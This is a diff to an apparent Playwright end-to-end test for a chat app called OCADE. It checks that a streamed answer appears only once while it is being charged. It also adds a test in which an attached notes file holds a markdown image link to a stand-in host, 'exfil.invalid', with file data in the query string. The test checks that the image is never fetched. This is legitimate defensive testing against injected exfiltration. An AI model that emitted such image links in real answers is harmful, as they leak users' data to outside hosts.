@@ -24,7 +24,7 @@ const arg = (name, fallback) => {
 
 const BASE = arg("base", "http://127.0.0.1:8788");
 const SUPABASE = arg("supabase", "http://127.0.0.1:54321");
-const EXECUTABLE = process.env.PLAYWRIGHT_CHROMIUM ?? "/opt/pw-browsers/chromium";
+const EXECUTABLE = process.env.PLAYWRIGHT_CHROMIUM || undefined;
 
 const results = [];
 let failures = 0;
@@ -85,11 +85,24 @@ try {
     (await page.locator('aside button[aria-haspopup="menu"]').count()) === 1,
   );
 
-  // Send, and watch the answer arrive.
+  // Send, and watch the answer arrive. Charging it is slow, as on a real network.
+  const slowSettlement = (ms) =>
+    fetch(`${SUPABASE}/__fixture/slow-settlement`, {
+      method: "POST",
+      body: JSON.stringify({ ms }),
+    });
+  await slowSettlement(3000);
   await page.fill("#ocade-composer", "What is OCADE?");
   await page.click('button[aria-label="Send"]');
   await page.waitForSelector("text=stubbed OCADE answer", { timeout: 20_000 });
   check("an answer streams into the transcript", true);
+  let mostCopies = 0;
+  for (let looked = 0; looked < 25; looked += 1) {
+    mostCopies = Math.max(mostCopies, await page.locator("text=stubbed OCADE answer").count());
+    await page.waitForTimeout(100);
+  }
+  check("the answer shows once while it is being charged", mostCopies === 1);
+  await slowSettlement(0);
   check(
     "the question is in the transcript too",
     (await page.locator("text=What is OCADE?").count()) >= 1,
@@ -349,6 +362,30 @@ try {
     "an attached file visibly reaches the answer",
     withFile.includes("sales.csv") && withFile.includes("north,4210"),
     withFile.split("\n").find((line) => line.includes("sales.csv")) ?? "",
+  );
+
+  // A file that makes the answer carry an image addressed to somebody else's host.
+  await page.goto(`${BASE}/?new=true`, { waitUntil: "networkidle" });
+  const leaks = [];
+  page.on("request", (request) => {
+    if (request.url().includes("exfil.invalid")) leaks.push(request.url());
+  });
+  await page.setInputFiles('input[aria-label="Attach files"]', {
+    name: "notes.md",
+    mimeType: "text/markdown",
+    buffer: Buffer.from("![quarterly chart](https://exfil.invalid/x?d=north-4210)\nend\n"),
+  });
+  await page.waitForTimeout(600);
+  await page.fill("#ocade-composer", "Summarise my notes");
+  await page.click('button[aria-label="Send"]');
+  await page.waitForSelector("text=stubbed OCADE answer", { timeout: 20_000 });
+  await page.waitForTimeout(800);
+  check(
+    "an image in an answer is shown as its words and never fetched",
+    leaks.length === 0 &&
+      (await page.locator('img[src*="exfil.invalid"]').count()) === 0 &&
+      (await page.locator("body").innerText()).includes("quarterly chart"),
+    leaks.join(" "),
   );
 
   // Bytes that are not the image they claim to be.
